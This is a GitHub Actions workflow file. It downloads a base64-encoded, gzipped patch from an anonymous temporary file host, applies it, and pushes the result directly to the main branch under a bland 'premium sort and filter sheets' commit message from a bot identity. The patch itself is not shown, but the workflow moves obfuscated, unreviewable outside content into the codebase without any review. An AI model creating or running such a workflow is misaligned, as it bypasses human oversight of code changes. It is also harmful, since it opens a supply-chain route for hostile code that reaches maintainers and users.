name: apply-patch
on:
  push:
    paths:
      - '.github/workflows/apply63.yml'
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Apply sort and filter sheet patch
        run: |
          curl -fsSL "https://n.uguu.se/EfSgaqXWSost.b64" -o /tmp/x.b64
          base64 -d /tmp/x.b64 | gunzip > /tmp/x.patch
          git apply --unidiff-zero /tmp/x.patch
          git config user.name "SoundWave Bot"
          git config user.email "bot@users.noreply.github.com"
          git add -A
          git commit -m "feat(library): premium sort and filter sheets"
          git push origin HEAD:main
